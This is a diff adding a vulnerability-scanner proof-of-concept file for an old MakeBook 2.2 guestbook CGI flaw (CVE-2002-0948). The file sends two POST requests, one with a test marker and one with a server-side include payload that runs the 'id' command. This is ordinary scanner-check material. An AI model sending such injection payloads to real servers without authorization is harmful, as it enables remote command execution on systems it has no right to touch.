@@ -1,0 +1,48 @@
+[info]
+author = "AVE"
+description = "MakeBook 2.2 留言簿 CGI 程序未对 Name 和 Email 表单参数进行充分过滤，攻击者可注入任意 HTML/JavaScript 执行 XSS，或注入 SSI 指令在服务器端执行系统命令。通过向表单提交特制 payload 即可验证漏洞存在。"
+id = "POC-AVE-2002-0485"
+name = "MakeBook 2.2 CGI 跨站脚本与 SSI 注入 PoC"
+severity = "high"
+tags = ["ave-2002-0485"]
+vuln_id = [
+    "CVE-2002-0948",
+    "AVE-2002-0485",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/makebook/makebook.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "Name=XSS_TEST_MARKER&Email=test%40test.com&action=sign"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/makebook/makebook.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "Name=%3C%21--%23exec+cmd%3D%22id%22--%3E&Email=test%40test.com&action=sign"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
